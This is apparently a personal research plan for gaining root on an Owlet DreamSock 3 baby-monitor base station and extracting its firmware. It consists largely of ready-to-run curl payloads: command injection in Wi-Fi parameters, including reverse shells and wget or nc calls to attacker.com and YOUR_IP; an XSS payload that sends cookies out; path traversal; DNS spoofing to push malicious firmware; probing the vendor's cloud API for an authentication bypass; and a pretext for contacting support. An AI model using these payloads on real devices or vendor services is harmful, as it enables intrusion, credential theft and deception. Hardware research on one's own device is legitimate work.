# Owlet DreamSock 3 - Root/Firmware Extraction Plan

**Objective:** Obtain root access or dump firmware without physical disassembly

**Device Info:**
- Base Station DSN: AC000W025363194
- Firmware: B1.0.3-c9c4_S1.0.4-64c1_BB0.7.34_SB0.7.33_SD6.1.1
- IP: 192.168.0.1 (when in AP mode)
- Cloud: SS3-Sleep-1a2039d9-device.aylanetworks.com

---

## Phase 1: Command Injection Testing (HIGHEST PRIORITY)

Owlet Cam (CVE-2023-6321) had command injection → root shell. Test similar vectors:

### Test Cases

**1.1 SSID Parameter Injection**
```bash
# Test shell metacharacters in SSID
curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=test;reboot&key=password'
curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=test$(id)test&key=password'
curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=test|wget${IFS}http://attacker.com/x.sh&key=password'

# Test command substitution
curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=`nc${IFS}attacker.com${IFS}4444${IFS}-e${IFS}/bin/sh`&key=test'
```

**1.2 Password/Key Parameter Injection**
```bash
curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=TestNetwork&key=pass;telnetd${IFS}-l${IFS}/bin/sh'
curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=TestNetwork&key=pass`wget${IFS}http://attacker.com/fw_dump.sh`'
```

**1.3 BSSID Parameter Injection**
```bash
curl -X POST 'http://192.168.0.1/wifi_connect.json?bssid=aa:bb:cc:dd:ee:ff;cat${IFS}/etc/passwd'
```

**1.4 Profile Deletion Injection**
```bash
curl -X DELETE 'http://192.168.0.1/wifi_profile.json?ssid=test;dd${IFS}if=/dev/mtdblock0${IFS}of=/tmp/fw.bin'
curl -X DELETE 'http://192.168.0.1/wifi_profile.json?ssid=test|busybox${IFS}httpd${IFS}-p${IFS}8080${IFS}-h${IFS}/'
```

### Detection Strategies
- Monitor device behavior (reboots, network activity)
- Check response timing (delays indicate command execution)
- Setup listener for reverse shells: `nc -lvnp 4444`
- Look for verbose errors revealing filesystem paths

---

## Phase 2: Hidden API Endpoint Discovery

### Common IoT/Ayla Endpoints to Probe

```bash
# System/Debug endpoints
curl -v http://192.168.0.1/status.json
curl -v http://192.168.0.1/system.json
curl -v http://192.168.0.1/version.json
curl -v http://192.168.0.1/config.json
curl -v http://192.168.0.1/debug.json
curl -v http://192.168.0.1/log.json
curl -v http://192.168.0.1/logs.json

# Firmware/Update endpoints
curl -v http://192.168.0.1/firmware.json
curl -v http://192.168.0.1/update.json
curl -v http://192.168.0.1/ota.json
curl -v http://192.168.0.1/factory.json
curl -v http://192.168.0.1/factory_reset.json

# Ayla-specific
curl -v http://192.168.0.1/ayla/config.json
curl -v http://192.168.0.1/cloud_config.json
curl -v http://192.168.0.1/device.json
curl -v http://192.168.0.1/properties.json

# Admin/Test endpoints
curl -v http://192.168.0.1/admin.json
curl -v http://192.168.0.1/test.json
curl -v http://192.168.0.1/diag.json
curl -v http://192.168.0.1/diagnostics.json
```

### Directory/File Fuzzing
```bash
# Common embedded web paths
for path in admin debug test config system firmware update ota logs diagnostics factory; do
  echo "Testing /$path"
  curl -s -o /dev/null -w "%{http_code}" http://192.168.0.1/$path
  curl -s -o /dev/null -w "%{http_code}" http://192.168.0.1/$path.html
  curl -s -o /dev/null -w "%{http_code}" http://192.168.0.1/$path.json
done
```

---

## Phase 3: Firmware Update Interception

### 3A: Ayla Cloud API Enumeration

**Goal:** Use Ayla Networks API to fetch firmware metadata/URLs

```bash
# Try unauthenticated device info
curl -v https://ads-dev.aylanetworks.com/apiv1/devices/AC000W025363194.json
curl -v https://ads-field.aylanetworks.com/apiv1/devices/AC000W025363194.json

# Try the device-specific endpoint from wifi_status.json
curl -v https://SS3-Sleep-1a2039d9-device.aylanetworks.com/
curl -v https://SS3-Sleep-1a2039d9-device.aylanetworks.com/apiv1/devices/AC000W025363194.json

# OTA service endpoints (from Ayla docs)
curl -v https://aos-dev.aylanetworks.com/otaservice/v1/host_images
```

**Research Ayla API authentication bypass or info disclosure vulnerabilities**

### 3B: MITM Firmware Update

**Prerequisites:**
- Device must be connected to your network (not just AP mode)
- Ability to intercept DNS/HTTP traffic

**Steps:**
1. Configure device to connect to your WiFi (via web UI)
2. Monitor traffic for firmware update checks
3. DNS spoof Ayla Networks domains:
   - `SS3-Sleep-1a2039d9-device.aylanetworks.com`
   - `*.aylanetworks.com`
4. Setup fake firmware server to:
   - Capture firmware download requests (reveals URLs)
   - Serve malicious firmware with debug enabled/root shell

**Tools:**
```bash
# DNS spoofing
echo "192.168.0.100 SS3-Sleep-1a2039d9-device.aylanetworks.com" >> /etc/hosts
dnsmasq --no-daemon --listen-address=192.168.0.100

# HTTP server for firmware
python3 -m http.server 80
# Or use mitmproxy for full MITM
mitmproxy --mode transparent
```

### 3C: Trigger OTA Update

**Check for update trigger mechanisms:**
```bash
# POST requests that might trigger update
curl -X POST http://192.168.0.1/update.json
curl -X POST http://192.168.0.1/check_update.json
curl -X POST http://192.168.0.1/ota.json
curl -X POST http://192.168.0.1/firmware_update.json

# Maybe via Ayla cloud (if we get API access)
# Force device to check for updates via cloud API
```

---

## Phase 4: Memory/Information Disclosure

### Test for Information Leakage

```bash
# Send malformed requests to trigger verbose errors
curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=' -v
curl -X GET 'http://192.168.0.1/wifi_status.json?../../etc/passwd' -v
curl -X DELETE 'http://192.168.0.1/wifi_profile.json' -v

# Fuzz content-types for different parsers
curl -H "Content-Type: application/json" -d '{"ssid":"../../../etc/passwd"}' http://192.168.0.1/wifi_connect.json
curl -H "Content-Type: application/xml" -d '<ssid>test</ssid>' http://192.168.0.1/wifi_connect.json

# Try to read files via path traversal
curl 'http://192.168.0.1/../../etc/passwd'
curl 'http://192.168.0.1/../../proc/self/cmdline'
curl 'http://192.168.0.1/../../proc/self/maps'
```

### Look for Debug Info in Responses
- Stack traces revealing binary paths
- Library versions (can identify kernel/libc)
- Filesystem structure
- Process names

---

## Phase 5: Authentication Bypass / Session Hijacking

### Test Authentication Mechanisms

```bash
# Check if any endpoints require auth that we're bypassing
curl -v http://192.168.0.1/admin -H "X-Admin: true"
curl -v http://192.168.0.1/debug -H "X-Debug: 1"
curl -v http://192.168.0.1/wifi_status.json -H "Authorization: Bearer test"

# Test for default credentials if any auth exists
# Common IoT defaults: admin/admin, root/root, admin/password
```

---

## Phase 6: Cross-Site Scripting (XSS) to Remote Code Execution

**If command injection fails, try XSS → privilege escalation:**

1. Inject malicious SSID via command line/API
2. XSS executes when admin views device (if there's an admin panel)
3. XSS payload exfiltrates session tokens or triggers admin actions
4. Use admin session to access firmware download features

**Test XSS in SSID field:**
```bash
curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=<script>alert(1)</script>&key=test'
curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=<img src=x onerror=fetch("http://attacker.com/"+document.cookie)>&key=test'
```

---

## Phase 7: Firmware Extraction via Cloud API (Research)

**Investigation tasks:**
1. Research Ayla Networks API documentation thoroughly
2. Look for publicly disclosed Ayla vulnerabilities
3. Check if firmware URLs are predictable/guessable
4. Search for Ayla OTA update mechanism documentation
5. Try to register as a developer to access OTA management console

**Potential firmware URL patterns:**
```
https://ayla-firmware.s3.amazonaws.com/owlet/...
https://cdn.aylanetworks.com/firmware/owlet/...
https://*.aylanetworks.com/ota/SS3/B1.0.3/...
```

---

## Phase 8: Social Engineering / Public Firmware Sources

**Check if firmware is publicly available:**
1. Search FCC database for firmware files (FCC ID: 2AIEP-0BL3A)
2. Check Owlet support site for firmware downloads
3. Search for "owlet dreamsock firmware download"
4. Check GitHub/pastebin for leaked firmware
5. Contact Owlet support requesting firmware for "development purposes"

---

## Fallback: Minimal Physical Access

**If all remote methods fail, minimal-invasive physical access:**

### UART Access (Non-destructive)
1. Look for UART test points on PCB (don't need to fully disassemble)
2. Common UART pinouts: GND, TX, RX, VCC (3.3V or 5V)
3. Use USB-to-UART adapter (CP2102, FTDI)
4. Baudrates to try: 115200, 57600, 38400, 9600
5. May get bootloader console or root shell

**Detection without opening:**
- Some devices have UART exposed via "debug" connectors
- USB port might expose UART (check USB-devices output)
- External programming headers

### Tools Needed (if going physical):
- Multimeter (identify UART pinout)
- USB-to-UART adapter ($5-10)
- Logic analyzer (optional, helps find baudrate)
- Flashrom + SPI programmer (for direct flash dump)

---

## Success Indicators

**Root Access Achieved If:**
- Shell prompt appears (via injection/UART)
- Can execute arbitrary commands
- Can read `/etc/passwd`, `/proc/cmdline`
- Can access `/dev/mtdX` (flash partitions)

**Firmware Dump Successful If:**
- Downloaded complete firmware image
- Binary file containing bootloader + kernel + filesystem
- Can extract with `binwalk -e firmware.bin`

---

## Next Steps When Device Is Online

**Start with these commands (requires device powered on and accessible):**

```bash
# 1. Full endpoint discovery
for endpoint in status system version config debug log firmware update ota factory cloud_config ayla/config device properties admin test diag diagnostics; do
  echo "=== Testing /$endpoint.json ==="
  curl -v http://192.168.0.1/$endpoint.json 2>&1 | grep -E "(HTTP|<|{)"
  echo
done > endpoint_discovery.txt

# 2. Command injection quick tests
curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=test;reboot&key=pass' -v
curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=test`sleep 10`&key=pass' -v  # timing attack

# 3. Start listening for reverse shell
nc -lvnp 4444  # in separate terminal

# 4. Trigger reverse shell (if injection works)
curl -X POST 'http://192.168.0.1/wifi_connect.json?ssid=test`/bin/sh -i >& /dev/tcp/YOUR_IP/4444 0>&1`&key=pass'
```

---

## References

- CVE-2023-6321: Owlet Cam command injection
- Ayla Networks API Docs: https://docs.aylanetworks.com/
- Ayla OTA Docs: https://docs.aylanetworks.com/docs/perform-ota-update
- Device DSN: AC000W025363194
- Firmware Version: B1.0.3-c9c4_S1.0.4-64c1_BB0.7.34_SB0.7.33_SD6.1.1
